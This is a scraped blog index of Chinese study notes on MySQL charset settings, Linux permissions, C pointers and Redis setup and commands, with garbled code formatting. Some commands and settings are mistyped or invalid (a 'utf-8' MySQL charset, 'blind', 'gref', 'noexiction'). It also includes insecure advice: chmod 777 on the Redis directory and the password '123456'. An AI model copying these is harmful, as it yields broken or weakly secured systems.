&#x2F;usr&#x2F;share&#x2F;mysql&#x2F;my-huge.cnf &#x2F;etc&#x2F;my.cnf 解决编码(已创建的数据库不影响)显示字符集 1show variables like &#39;%char%&#39; 修改客户端和服务器的字符集 12345678910111213vim &#x2F;etc&#x2F;my.cnf&#x2F;&#x2F;在[client]的socket的下方插入&#x2F;&#x2F;在光标的下一行插入 使用odefault-character-set&#x3D;utf-8&#x2F;&#x2F;在[mysqld]的port下插入character_set_server&#x3D;utf8character_set_client&#x3D;utf8collation-server&#x3D;utf8_general_ci&#x2F;&#x2F;在[mysql]的no-auto-rehash下插入default-character-set&#x3D;utf8 Linux中常用到的命令显示文件目录命令ls 如ls改变当前目录命令cd 如cd /home建立子目录mkdir 如mkdir xiong删除子目录命令rmdir 如rmdir /mnt/cdrom删除文件命令rm 如rm /ucdos.bat文件复制命令cp 如cp /ucdos /fox获取帮助信息命令man 如man ls显示文件的内容less 如less mwm.lx Linux文件属性有哪些？（共十位）-rw-r—r—那个是权限符号，总共是- —- —- —-这几个位。 第一个短横处是文件类型识别符：-表示普通文件；c表示字符设备（character）；b表示块设备（block）；d表示目录（directory）；l表示链接文件（link）； 第一个三个连续的短横是用户权限位（User） 第二个三个连续短横是组权限位（Group） 第三个三个连续短横是其他权限位（Other）。每个权限位有三个权限，r（读权限），w（写权限），x（执行权限）。 如果每个权限位都有权限存在，那么满权限的情况就是：-rwxrwxrwx；权限为空的情况就是- —- —- —-。权限的设定可以用chmod命令，其格式位：chmod ugoa+/-/=rwx filename/directory。例如：一个文件aaa具有完全空的权限- —- —- —-。chmod u+rw aaa（给用户权限位设置（增加）读写权限，其权限表示为：- rw- —- —-）chmod g+r aaa（给组设置权限为可读，其权限表示为：- —- r— —-）chmod ugo+rw aaa（给用户、组、其它用户或组设置权限为读写，权限表示为：- rw- rw- rw-）如果aaa具有满权限- rwx rwx rwx。chmod u-x aaa（去掉用户可执行权限，权限表示为：- rw- rwx rwx）如果要给aaa赋予制定权限- rwx r-x r-x，命令为：chmod u=rwx，go=rx aaa","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://kayleh.top/tags/linux/"}]},{"title":"C pointer","slug":"C-prime-plus","date":"2020-06-28T01:33:01.000Z","updated":"2021-04-11T17:11:28.115Z","comments":true,"path":"c-pointer/","link":"","permalink":"https://kayleh.top/c-pointer/","excerpt":"指针","text":"指针 每一个变量都有一个内存位置，每一个内存位置都定义了可使用连字号（&amp;）运算符访问的地址，它表示了在内存中的一个地址。取地址&amp; 取值* 123456789#include &lt;stdio.h&gt;int main()&#123; int a; char b[10]; printf(\"a变量的内存地址：%p\\n\", &amp;a); printf(\"b变量的内存地址：%p\\n\", &amp;b); return 0;&#125; 访问数组b的地址其实就是数组第一个变量的数组 指针是一个变量，其值为另一个变量的地址，即，内存位置的直接地址。就像其他变量或常量一样，您必须在使用指针存储其他变量地址之前，对其进行声明。指针变量声明的一般形式为： 1type *var-name; 在这里，type 是指针的基类型，它必须是一个有效的 C 数据类型，var-name 是指针变量的名称。用来声明指针的星号 * 与乘法中使用的星号是相同的。但是，在这个语句中，星号是用来指定一个变量是指针。以下是有效的指针声明： 1234int *ip; /* 一个整型的指针 */double *dp; /* 一个 double 型的指针 */float *fp; /* 一个浮点型的指针 */char *ch; /* 一个字符型的指针 */ 所有实际数据类型，不管是整型、浮点型、字符型，还是其他的数据类型，对应指针的值的类型都是一样的，都是一个代表内存地址的长的十六进制数。 指针的使用 使用指针时会频繁进行以下几个操作：定义一个指针变量、把变量地址赋值给指针、访问指针变量中可用地址的值。这些是通过使用一元运算符 * 来返回位于操作数所指定地址的变量的值。下面的实例涉及到了这些操作： 12345678910111213141516171819#include &lt;stdio.h&gt; int main ()&#123; int var = 20; /* 实际变量的声明 */ int *ip; /* 指针变量的声明 */ ip = &amp;var; /* 在指针变量中存储 var 的地址 */ printf(\"Address of var variable: %p\\n\", &amp;var ); /* 在指针变量中存储的地址 */ printf(\"Address stored in ip variable: %p\\n\", ip ); /* 使用指针访问值 */ printf(\"Value of *ip variable: %d\\n\", *ip ); //20 return 0;&#125; C 中的 NULL 指针在变量声明的时候，如果没有确切的地址可以赋值，为指针变量赋一个 NULL 值是一个良好的编程习惯。赋为 NULL 值的指针被称为空指针。 NULL 指针是一个定义在标准库中的值为零的常量。请看下面的程序： 12345678910#include &lt;stdio.h&gt; int main ()&#123; int *ptr = NULL; printf(\"ptr 的地址是 %p\\n\", ptr ); return 0;&#125; 在大多数的操作系统上，程序不允许访问地址为 0 的内存，因为该内存是操作系统保留的。然而，内存地址 0 有特别重要的意义，它表明该指针不指向一个可访问的内存位置。但按照惯例，如果指针包含空值（零值），则假定它不指向任何东西。 如需检查一个空指针，您可以使用 if 语句，如下所示： 12if(ptr) /* 如果 p 非空，则完成 */if(!ptr) /* 如果 p 为空，则完成 */ 指针的算数运算C 指针是一个用数值表示的地址。因此，您可以对指针执行算术运算。可以对指针进行四种算术运算：++、—、+、-。 假设 ptr 是一个指向地址 1000 的整型指针，是一个 32 位的整数，让我们对该指针执行下列的算术运算： 1ptr++ 在执行完上述的运算之后，ptr 将指向位置 1004，因为 ptr 每增加一次，它都将指向下一个整数位置，即当前位置往后移 4 字节。这个运算会在不影响内存位置中实际值的情况下，移动指针到下一个内存位置。如果 ptr 指向一个地址为 1000 的字符，上面的运算会导致指针指向位置 1001，因为下一个字符位置是在 1001。 我们概括一下： 指针的每一次递增，它其实会指向下一个元素的存储单元。 指针的每一次递减，它都会指向前一个元素的存储单元。 指针在递增和递减时跳跃的字节数取决于指针所指向变量数据类型长度，比如 int 就是 4 个字节。 递增一个指针我们喜欢在程序中使用指针代替数组，因为变量指针可以递增，而数组不能递增，数组可以看成一个指针常量。下面的程序递增变量指针，以便顺序访问数组中的每一个元素： 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt; const int MAX = 3; int main ()&#123; int var[] = &#123;10, 100, 200&#125;; int i, *ptr; /* 指针中的数组地址 */ ptr = var; for ( i = 0; i &lt; MAX; i++) &#123; printf(\"存储地址：var[%d] = %x\\n\", i, ptr ); printf(\"存储值：var[%d] = %d\\n\", i, *ptr ); /* 移动到下一个位置 */ ptr++; &#125; return 0;&#125;----存储地址：var[0] = bf882b30存储值：var[0] = 10存储地址：of var[1] = bf882b34存储值： var[1] = 100存储地址：of var[2] = bf882b38存储值：var[2] = 200 指针的比较指针可以用关系运算符进行比较，如 ==、&lt; 和 &gt;。如果 p1 和 p2 指向两个相关的变量，比如同一个数组中的不同元素，则可对 p1 和 p2 进行大小比较。 下面的程序修改了上面的实例，只要变量指针所指向的地址小于或等于数组的最后一个元素的地址 &amp;var[MAX - 1]，则把变量指针进行递增： 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt; const int MAX = 3; int main ()&#123; int var[] = &#123;10, 100, 200&#125;; int i, *ptr; /* 指针中第一个元素的地址 */ ptr = var; i = 0; while ( ptr &lt;= &amp;var[MAX - 1] ) &#123; printf(\"Address of var[%d] = %p\\n\", i, ptr ); printf(\"Value of var[%d] = %d\\n\", i, *ptr ); /* 指向上一个位置 */ ptr++; i++; &#125; return 0;&#125;----------------Address of var[0] = bfdbcb20Value of var[0] = 10Address of var[1] = bfdbcb24Value of var[1] = 100Address of var[2] = bfdbcb28Value of var[2] = 200 指针数组一个指向整数的指针数组的声明： 1int *ptr[MAX]; 在这里，把 ptr 声明为一个数组，由 MAX 个整数指针组成。因此，ptr 中的每个元素，都是一个指向 int 值的指针。下面的实例用到了三个整数，它们将存储在一个指针数组中，如下所示： 1234567891011121314151617181920212223#include &lt;stdio.h&gt; const int MAX = 3; int main ()&#123; int var[] = &#123;10, 100, 200&#125;; int i, *ptr[MAX]; for ( i = 0; i &lt; MAX; i++) &#123; ptr[i] = &amp;var[i]; /* 赋值为整数的地址 */ &#125; for ( i = 0; i &lt; MAX; i++) &#123; printf(\"Value of var[%d] = %d\\n\", i, *ptr[i] ); &#125; return 0;&#125;------Value of var[0] = 10Value of var[1] = 100Value of var[2] = 200 您也可以用一个指向字符的指针数组来存储一个字符串列表，如下： 12345678910111213141516171819202122232425#include &lt;stdio.h&gt; const int MAX = 4; int main ()&#123; const char *names[] = &#123; \"Zara Ali\", \"Hina Ali\", \"Nuha Ali\", \"Sara Ali\", &#125;; int i = 0; for ( i = 0; i &lt; MAX; i++) &#123; printf(\"Value of names[%d] = %s\\n\", i, names[i] ); &#125; return 0;&#125;------Value of names[0] = Zara AliValue of names[1] = Hina AliValue of names[2] = Nuha AliValue of names[3] = Sara Ali 指向指针的指针 指向指针的指针是一种多级间接寻址的形式，或者说是一个指针链。通常，一个指针包含一个变量的地址。当我们定义一个指向指针的指针时，第一个指针包含了第二个指针的地址，第二个指针指向包含实际值的位置。 1234 Pointer Pointer Variable _____________ _____________ _____________| Address | ------&gt;| Address |--------&gt;| Value ||_____________| |_____________| |_____________| 一个指向指针的指针变量必须如下声明，即在变量名前放置两个星号。例如，下面声明了一个指向 int 类型指针的指针： 1int **var; 当一个目标值被一个指针间接指向到另一个指针时，访问这个值需要使用两个星号运算符，如下面实例所示： 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt; int main ()&#123; int var; int *ptr; int **pptr; var = 3000; /* 获取 var 的地址 */ ptr = &amp;var; /* 使用运算符 &amp; 获取 ptr 的地址 */ pptr = &amp;ptr; /* 使用 pptr 获取值 */ printf(\"Value of var = %d\\n\", var ); printf(\"Value available at *ptr = %d\\n\", *ptr ); printf(\"Value available at **pptr = %d\\n\", **pptr); return 0;&#125;-------------------Value of var = 3000Value available at *ptr = 3000Value available at **pptr = 3000 指针数组和数组指针12int *p1[5] ----------指针数组int (*p2)[5]---------数组指针 指针数组是一个数组，每个数组元素存放一个指针变量。 1234567891011121314151617#include &lt;stdio.h&gt;int main()&#123; //指针数组，里面存的是指针 char *p1[5] = &#123;\"wo\", \"jiao\", \"Kayleh\", \"!\"&#125;; int i; for (i = 0; i &lt; 5; i++) &#123; /* code */ // %s会取地址对应的值，char形是特列,通过字符串首地址输出字符串 printf(\"%s\\n\", p1[i]); &#125;&#125; 数组指针是一个指针，它指向的是一个数组 12345678910111213141516#include &lt;stdio.h&gt;int main()&#123; int temp[5] = &#123;1, 2, 3, 4, 5&#125;; //&amp;temp表示取出整个数组的地址 //temp表示数组的第一个元素的地址 int(*p2)[5] = &amp;temp; int i; for (i = 0; i &lt; 5; i++) &#123; /* code */ //内部的*取得是数组的，外部的取得是数组元素的 printf(\"%d\\n\", *(*p2 + i)); &#125; return 0;&#125; 二维数组数组名实际上是第一组一维数组的指针。 1234array[4][5]*(array+1) = array[1] = &amp;array[1][0]*(array+1)+3 == &amp;array[1][3] 结论 123*(array+i) == array[i]*(*(array+i)+j) == &amp;array[i][j]*(*(*(array+i)+j)+k) == &amp;array[i][j][k] 初始化二维数组 1int array[][3];&#x2F;&#x2F;前面的可不写 数组指针和二维数组 void指针 void指针称为通用指针，就是可以指向任意类型的数据。也就是说，任何类型的指针都可以赋值给void指针 1234567891011121314151617181920#include &lt;stdio.h&gt;int main()&#123; int num = 1024; int *pi = &amp;num; char *pc = \"Kayleh\"; void *pv; pv = pi; printf(\"pi:%p,pv:%p\\n\", pi, pv); printf(\"pv:%d\\n\", *(int *)pv); //强制转换 pv = pc; printf(\"pc:%p,pv:%p\\n\", pc, pv); //因为字符数组中每一个元素都相当于一个指针变量，就不需要在加*了，不用解引用 printf(\"pv:%s\\n\", pv); return 0;&#125; NULL指针1#define NULL ((void *)0) 12345678910#include &lt;stdio.h&gt;int main()&#123; int *p1; int *p2 = NULL; printf(\"%d\\n\", *p1); printf(\"%d\\n\", *p2); return 0;&#125; 函数定义 1234return_type function_name( parameter list )&#123; body of the function&#125; 返回类型：一个函数可以返回一个值。return_type 是函数返回的值的数据类型。有些函数执行所需的操作而不返回值，在这种情况下，return_type 是关键字 void。 函数名称：这是函数的实际名称。函数名和参数列表一起构成了函数签名。 参数：参数就像是占位符。当函数被调用时，您向参数传递一个值，这个值被称为实际参数。参数列表包括函数参数的类型、顺序、数量。参数是可选的，也就是说，函数可能不包含参数。 函数主体：函数主体包含一组定义函数执行任务的语句。 函数指针函数指针是指向函数的指针变量。 通常我们说的指针变量是指向一个整型、字符型或数组等变量，而函数指针是指向函数。 函数指针可以像一般函数一样，用于调用函数、传递参数。 函数指针变量的声明： 1typedef int (*fun_ptr)(int,int); // 声明一个指向同样参数、返回值的函数指针类型 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt; int max(int x, int y)&#123; return x &gt; y ? x : y;&#125; int main(void)&#123; /* p 是函数指针 */ int (* p)(int, int) = &amp; max; // &amp;可以省略 int a, b, c, d; printf(\"请输入三个数字:\"); scanf(\"%d %d %d\", &amp; a, &amp; b, &amp; c); /* 与直接调用函数等价，d = max(max(a, b), c) */ d = p(p(a, b), c); printf(\"最大的数字是: %d\\n\", d); return 0;&#125;------------------请输入三个数字:1 2 3最大的数字是: 3 回调函数函数指针作为某个函数的参数函数指针变量可以作为某个函数的参数来使用的，回调函数就是一个通过函数指针调用的函数。 简单讲：回调函数是由别人的函数执行时调用你实现的函数。 以下是来自知乎作者常溪玲的解说： 你到一个商店买东西，刚好你要的东西没有货，于是你在店员那里留下了你的电话，过了几天店里有货了，店员就打了你的电话，然后你接到电话后就到店里去取了货。在这个例子里，你的电话号码就叫回调函数，你把电话留给店员就叫登记回调函数，店里后来有货了叫做触发了回调关联的事件，店员给你打电话叫做调用回调函数，你到店里去取货叫做响应回调事件。 实例实例中 populate_array 函数定义了三个参数，其中第三个参数是函数的指针，通过该函数来设置数组的值。 实例中我们定义了回调函数 getNextRandomValue，它返回一个随机值，它作为一个函数指针传递给 populate_array 函数。 populate_array 将调用 10 次回调函数，并将回调函数的返回值赋值给数组。 12345678910111213141516171819202122232425262728#include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; // 回调函数void populate_array(int *array, size_t arraySize, int (*getNextValue)(void))&#123; for (size_t i=0; i&lt;arraySize; i++) array[i] = getNextValue();&#125; // 获取随机值int getNextRandomValue(void)&#123; return rand();&#125; int main(void)&#123; int myarray[10]; populate_array(myarray, 10, getNextRandomValue); for(int i = 0; i &lt; 10; i++) &#123; printf(\"%d \", myarray[i]); &#125; printf(\"\\n\"); return 0;&#125;--------------------16807 282475249 1622650073 984943658 1144108930 470211272 101027544 1457850878 1458777923 2007237709 C 传递指针给函数C 语言允许您传递指针给函数，只需要简单地声明函数参数为指针类型即可。 下面的实例中，我们传递一个无符号的 long 型指针给函数，并在函数内改变这个值： 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;time.h&gt; void getSeconds(unsigned long *par);int main ()&#123; unsigned long sec; getSeconds( &amp;sec ); /* 输出实际值 */ printf(\"Number of seconds: %ld\\n\", sec ); return 0;&#125;void getSeconds(unsigned long *par)&#123; /* 获取当前的秒数 */ *par = time( NULL ); return;&#125;------------------Number of seconds :1294450468 能接受指针作为参数的函数，也能接受数组作为参数，如下所示： 123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt; /* 函数声明 */double getAverage(int *arr, int size); int main ()&#123; /* 带有 5 个元素的整型数组 */ int balance[5] = &#123;1000, 2, 3, 17, 50&#125;; double avg; /* 传递一个指向数组的指针作为参数 */ avg = getAverage( balance, 5 ) ; /* 输出返回值 */ printf(\"Average value is: %f\\n\", avg ); return 0;&#125;double getAverage(int *arr, int size)&#123; int i, sum = 0; double avg; for (i = 0; i &lt; size; ++i) &#123; sum += arr[i]; &#125; avg = (double)sum / size; return avg;&#125;------------------Average value is: 214.40000 C 从函数返回指针 C 允许您从函数返回指针。为了做到这点，您必须声明一个返回指针的函数，如下所示： 123456int * myFunction()&#123;...&#125; C 语言不支持在调用函数时返回局部变量的地址，除非定义局部变量为 static 变量。 现在，让我们来看下面的函数，它会生成 10 个随机数，并使用表示指针的数组名（即第一个数组元素的地址）来返回它们，具体如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;time.h&gt;#include &lt;stdlib.h&gt; /* 要生成和返回随机数的函数 */int * getRandom( )&#123; static int r[10]; int i; /* 设置种子 */ srand( (unsigned)time( NULL ) ); for ( i = 0; i &lt; 10; ++i) &#123; r[i] = rand(); printf(\"%d\\n\", r[i] ); &#125; return r;&#125; /* 要调用上面定义函数的主函数 */int main ()&#123; /* 一个指向整数的指针 */ int *p; int i; p = getRandom(); for ( i = 0; i &lt; 10; i++ ) &#123; printf(\"*(p + [%d]) : %d\\n\", i, *(p + i) ); &#125; return 0;&#125;-----------------------15231980531187214107110830097843049495914213012769309710841232504841069321401604461820149169022*(p + [0]) : 1523198053*(p + [1]) : 1187214107*(p + [2]) : 1108300978*(p + [3]) : 430494959*(p + [4]) : 1421301276*(p + [5]) : 930971084*(p + [6]) : 123250484*(p + [7]) : 106932140*(p + [8]) : 1604461820*(p + [9]) : 149169022 字符串 C 中有大量操作字符串的函数： 函数 目的 strcpy(s1, s2); 复制字符串 s2 到字符串 s1。 strcat(s1, s2); 连接字符串 s2 到字符串 s1 的末尾。 strlen(s1); 返回字符串 s1 的长度。 strcmp(s1, s2); 如果 s1 和 s2 是相同的，则返回 0；如果 s1s2 则返回大于 0。 strchr(s1, ch); 返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。 strstr(s1, s2); 返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置。 C 结构体C 数组允许定义可存储相同类型数据项的变量，结构是 C 编程中另一种用户自定义的可用的数据类型，它允许您存储不同类型的数据项。 结构用于表示一条记录，假设您想要跟踪图书馆中书本的动态，您可能需要跟踪每本书的下列属性： Title Author Subject Book ID 定义结构为了定义结构，您必须使用 struct 语句。struct 语句定义了一个包含多个成员的新的数据类型，struct 语句的格式如下： 123456struct tag &#123; member-list member-list member-list ...&#125; variable-list ; tag 是结构体标签。 member-list 是标准的变量定义，比如 int i; 或者 float f，或者其他有效的变量定义。 variable-list 结构变量，定义在结构的末尾，最后一个分号之前，您可以指定一个或多个结构变量。下面是声明 Book 结构的方式： 1234567struct Books&#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125; book 在一般情况下，tag、member-list、variable-list 这 3 部分至少要出现 2 个。 结构体的成员可以包含其他结构体，也可以包含指向自己结构体类型的指针，而通常这种指针的应用是为了实现一些更高级的数据结构如链表和树等。 12345678910111213//此结构体的声明包含了其他的结构体struct COMPLEX&#123; char string[100]; struct SIMPLE a;&#125;; //此结构体的声明包含了指向自己类型的指针struct NODE&#123; char string[100]; struct NODE *next_node;&#125;;","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://kayleh.top/tags/C/"}]},{"title":"Redis","slug":"Redis","date":"2020-06-27T01:30:29.000Z","updated":"2021-04-15T15:12:07.281Z","comments":true,"path":"redis/","link":"","permalink":"https://kayleh.top/redis/","excerpt":"Redis","text":"Redis 在Linux下安装 https://redis.io/ 官网下载，移动到/opt 目录下. 在终端使用命令解压 1$ tar -zxvf redis-XXXXXX.tar.gz 进入解压后的目录,运行make指令(需要GCC编译器) 123$ cd redis.XXX$ make$ make install 进入默认安装的目录 1$ cd usr&#x2F;local&#x2F;bin 在根目录创建一个文件夹/myredis，把安装目录下的redis.conf复制到/myredis，复制的目的是不影响出厂的设置 1cp redis.conf &#x2F;myredis 要把myredis的权限修改,否则会出现redis无法SHUTDOWN的问题 1sudo chmod 777 &#x2F;myredis 修改复制过来的conf 1vim redis.conf 修改为为yes 1234567原来的：##########GENERAL###################XXXdaemonzie no修改为:daemonize yes 检查有没有启动Redis 1$ ps -ef|gref redis 检查端口是否启动 1lsof -i :6379 结果是没有启动的 启动方法：在/usr/local/bin下： 1$ redis-server &#x2F;myredis&#x2F;redis.conf 默认端口是6379 1$ redis-cli -p 6379 检查是否连接成功 1127.0.0.1:6379&gt; ping 1PONG 返回PONG表示成功 退出： 12127.0.0.1:6379&gt; SHUTDOWNexit KEY关键字12345678910DBSIZE &#x2F;&#x2F;当前数据库的key的数量select db &#x2F;&#x2F;切换数据库Flushdb &#x2F;&#x2F;清空当前库Flushall &#x2F;&#x2F;清空所有库key * 当前库所有的keyexists key &#x2F;&#x2F;判断key是否存在，有返回1，无则0move key db &#x2F;&#x2F;移动到目标库，当前库的移除expire key 秒钟 &#x2F;&#x2F;给key设置过期时间，过期后查询到的是nid空值ttl key &#x2F;&#x2F;查看还有多久过期，-1表示永不过期，-2表示已过期type key &#x2F;&#x2F;查看key是什么类型 redis五种数据结构String：字符串123456789101112set key valueget keydel keyappend key value &#x2F;&#x2F;在value后追加strlen &#x2F;&#x2F;String长度INCR&#x2F;DECR KEY&#x2F;&#x2F;一定要是数字，自增自减INCRBY&#x2F;DECRBY KEY 步长 &#x2F;&#x2F;多步递增递减getrange&#x2F;setrange key index index &#x2F;&#x2F;根据索引取值设置值setex key 秒钟 value &#x2F;&#x2F;设置值的时候设置过期时间setnx &#x2F;&#x2F;set if not existmset key1 value1 key2 value2 &#x2F;&#x2F; 设置多个值mget&#x2F;msetnx List：列表1234567891011LPUSH list1 1 2 3 4 5 (类似栈)LRANGE list1 0 -154321lpop list1&quot;5&quot;rpop list1&quot;1&quot; 1234567891011RPUSH list2 1 2 3 4 5LRANGE list2 0 -112345lpop list2&quot;1&quot;rpop list2&quot;5&quot; 1234567lindex &#x2F;&#x2F;按照索引下标获得元素，（从上到下）llen &#x2F;&#x2F;长度LREM KEY N Value &#x2F;&#x2F;删除key数组中的N个ValueLTRIM KEY 开始index 结束index &#x2F;&#x2F;截取指定范围的值后在赋值给keyrpoplpush 源列表 目的列表 &#x2F;&#x2F;把源列表的最底的值移动到目的列表的最上面lset key index value &#x2F;&#x2F;根据数组下标设置成valuelinsert key before&#x2F;after 值1 值2 &#x2F;&#x2F;把值2的值插入到key数组值1的前面&#x2F;后面 Set：集合1234567891011sadd key value1，value1，value2 &#x2F;&#x2F;只会进去不重复的值 smembers key value 0 -1 &#x2F;&#x2F;打印全部sismember key value &#x2F;&#x2F;判断value是否在key里scard &#x2F;&#x2F;获取集合里面的元素srem key value &#x2F;&#x2F;删除集合中元素srandmember key &#x2F;&#x2F;随机出几个数spop key &#x2F;&#x2F;随机出栈smove key1 key2 在key1里某个值 &#x2F;&#x2F;将key1里的某个值赋给key2sdiff set1 set2 &#x2F;&#x2F;差集，set1里有的，set2没有的sinter set1 set2 &#x2F;&#x2F;交集，都有的sunion set1 set2 &#x2F;&#x2F;并集 Hash ：哈希12345678910value是一个键值对hset key &lt;key1,value1&gt;hget key key1hmset KEY1 keyA valueA KEY2 keyB valueBhmgetall hdel KEY1 keyAHEXISTS KEY1 keyA &#x2F;&#x2F;判断是否存在hkeys&#x2F;kvals KEY1hincrby&#x2F;hincrbyfloat KEY1 keyA 步长&#x2F;浮点数 &#x2F;&#x2F;自增自减hsetnx Zset（sorted set）：有序集合在set基础上，加一个score值 set是 k1 v1 v2 v3 zset是 k1 score1 v1 score2 v2 12345678910111213zadd key k1 score1 v1 score2 v2zrange key 0 -1 &#x2F;&#x2F;只会打印valuezrange key 0 -1 withscores &#x2F;&#x2F;会打印v1，score，v2，scorezrangebyscore key 开始score 结束score &#x2F;&#x2F; &quot;（&quot; 表示不包含， a（ b 表示大于等于a，小于b zrangebyscore key 开始score 结束score withscorezrangebyscore key 开始score 结束score limit 开始下标步 多少步 zrem key score对应的value &#x2F;&#x2F;删除元素zacard key &#x2F;&#x2F;统计key里value的个数zcount key score区间zrank key value &#x2F;&#x2F;获取下标zrevrank key value &#x2F;&#x2F;获取反转后的下标zrevrange key 0 -1&#x2F;&#x2F;反转集合zrevrangebyscore key 结束score 开始score &#x2F;&#x2F;反转集合，index也要反转 配置文件Units1.配置大小单位，开头定义了一些基本的度量单位，只支持bytes，不支持bit 2.对大小写不敏感 INCLUDES可以通过includes包含，redis.conf可以作为总闸,包含其他 GENERALdaemonize 默认为no pidfile 进程管道id文件 port 默认端口 tcp-backlog,backlog 511是一个连接队列,在高并发环境下你需要一个高backlog值来避免慢客户端连接问题 bind 端口及网卡的绑定 timeout 0 当系统空闲一段时间后中断 Tcp-keepalive 单位为秒,设置为0则不会进行Keepalive检测 loglevel notice 日志级别 logfile 日志文件 syslog-enabled 是否把日志输出到syslog中 syslog-ident 指定syslog里的日志标志 syslog-facility 指定syslog设备,值可以是USER或LOCAL0-LOCAL7 databases 默认有16个库 SECURITY123config get requirepassconfig set requirepass &quot;123456&quot; &#x2F;&#x2F;立即生效访问任何命令前使用 auth 123456 LIMITmaxclients 10000 允许10000人连接 maxmemory maxmemory-policy noexiction 缓存过期清洁策略 ,默认永不过期 volatile-lru:使用LRU算法移除key,只对设置了过期时间的键 allkeys-lru:使用LRU算法移除key volatile-random:在过期集合中移除随机的key,只对设置了过期时间的键 allkeys-random:移除随机的key volatile-ttl:移除那些TTL值最小的key,即那些最近要过期的key noexiction :不进行移除.针对写操作,只是返回错误信息 LRU算法:最近最少使用的 Maxmemory-samples 设置样本数量,LRU算法和最小TTL算法都并非是精确的算法,而是估算值,所以你可以设置样本的大小,redis默认会检查这么多个key并选择其中LRU的那个; 常用配置 redis默认不是以守护进程的方式运行,可以通过该配置项修改,使用yes启动守护进程 1daemonize no 当Redis以守护进程方式运行时,Redis默认会把pid写入/var/run/redis.pid文件,可以通过pidfile指定 1pid &#x2F;var&#x2F;run&#x2F;redis.pid 指定redis监听端口,默认端口为63791port 6379 绑定的主机地址1blind 127.0.0.1 当客户端闲置多长时间后关闭连接,如果指定为0,表示关闭该功能1timeout 300 指定日志记录级别,Redis总共支持四个级别,debug、verbose、notice、warning，默认为verbose1loglevel verbose 日志记录方式，默认为标准输出，如果配置Redis为守护进程方式，而这里又配置为日志记录方式为标准输出，则日志将会发送给/dev/null 1logfile stdout 设置数据库的数量，默认数据库为0，可以使用命令在连接上指定数据库id 1databases 16 指定在多长时间内，有多少次更新操作，就将数据同步到数据文件，可以多个条件配合 12345save &lt;seconds&gt; &lt;changes&gt;Redis默认配置文件中提供了三个条件:save 900 1save 300 10save 60 10000 指定存储至本地数据库时是否压缩数据，默认为yes，Redis采用LZF压缩，如果为了节省CPU时间，可以关闭该选项，但会导致数据库文件变的巨大 1rdbcompression yes 指定本地数据库文件名，默认为dump.rdb 1dbfilename dump.rdb 指定本地数据库存放目录 1dir .&#x2F; 设置当本机为slav服务时，设置master服务的IP地址及端口，在Redis启动时，它会自动从master进行数据同步 1slaveof &lt;masterip&gt; &lt;masterport&gt; 当master服务先设置了密码保护，slav服务连接master的密码 1masterauth &lt;master-password&gt; 设置Redis连接密码，如果配置了连接密码，客户端在连接Redis时需要通过AUTH 命令提供密码，默认关闭 1requirepass foobared 设置同一时间最大客户端连接数，默认无限制，Redis可以同时打开的客户端连接数为Redis进程可以打开的最大文件描述符，如果设置 maxclients 0，表示不作限制。当客户端连接数到达限制时，Redis会关闭新的连接并向客户端返回max numbers of clients reached 错误信息 1maxclients 128 指定Redis最大内存限制，Redis在启动时会把数据加载到内存中，达到最大内存后，redis会先尝试清除已到期或即将到期的Key，当此方法处理后，仍然到达最大内存设置，将无法再进行写入操作，但仍然可以进行读取操作。Redis新的vm机制，会把key存放内存，value会存放在swap区。 1maxmemory &lt;bytes&gt; 指定是否在每次更新操作后进行日志记录。Redis在默认情况下时异步的把数据写入磁盘，如果不开启，可能会在断电时导致一段时间内的数据丢失。因为redis本身同步数据文件时按save条件来同步的，所以有的数据会在一段时间内只存在内存中。默认为no 1appendonly no 指定更新日志文件名，默认为appendonly.aof 1appendfilename appendonly.aof 指定更新日志条件，共有3个可选值： 1234appendfsync everysecno: 表示等操作系统进行数据缓存同步到磁盘（快）always：表示每次更新操作后手动调用fsync()将数据写到磁盘（慢，安全）everysec：表示每秒同步一次（折中，默认值） 指定是否启用虚拟内存机制，默认为no。VM机制将数据分页存放，有Redis将访问量较少的页即冷数据swap到磁盘上，访问多的页面由磁盘换出到内存中 1vm-enabled no 虚拟内存文件路径,默认值为/tmp/redis.swap 1vm-swap-file &#x2F;tmp&#x2F;redis.swap 将所有大于vm-max-memory的数据存入虚拟内存，无论vm-max-memory设置多小，所有索引数据都是内存存储的(Redis的索引数据 就是keys)，也就是说，当vm-max-memory设置为0的时候，其实是所有value都存在于磁盘。默认为0 1vm-max-memory 0 Redis swap文件分成了很多page，一个对象可以保存在多个page上面，但一个page上不能被多个对象共享，vm-page-size是要根据存储的数据大小来设定的，作者建议如果存储很多小对象，page大小最好设置为32或者64bytes;如果存储很大的对象，则可以使用更大的page，如果不确定，就使用默认值 1vm-page-size 32 设置swap文件中的page数量，由于页表(一种表示页面空闲或使用的bitmap)是放在内存中的，在磁盘上每8个page将消耗1bytes的内存 1vm-pages 134217728 设置访问swap文件的线程数，最好不要超过机器的核数，如果设置为0，那么所有对swap文件的操作都是串行的，可能会造成比较长时间的延迟。默认值为4 1vm-max-threads 4 设置在向客户端应答时，是否把较小的包含并为一个包发送，默认为开启 1glueoutputbuf yes 指定在超过一定的数量或者最大的元素超过某一临界值时，采用一种特殊的哈希算法 12hash-max-zipmap-entries 64hash-max-zipmap-value 512 指定是否激活重置哈希，默认为开启 1activerehashing yes 指定包含其他的配置文件，可以在同一主机上多个Redis实例之间同一份配置文件，而同时各个实例又拥有自己的特定配置文件 1inclue &#x2F;path&#x2F;to.local,conf Redis持久化RDB 在指定的时间间隔内将内存中的数据集快照写入磁盘，即Snapshot快照，它恢复时是将快照文件直接读到内存里 是什么？Redis会单独创建(fork)一个子进程来进行持久化，会先将数据写入到一个临时文件中，待持久化过程都结束了，再用这个临时文件，替换上次持久化好的文件。 整个过程中，主进程是不进行任何IO操作的，这就确保了极高的性能。 如果需要进行大规模数据的恢复，且对于数据恢复的完整性不是非常敏感，那RDB方法要比AOF方式更加的高效。 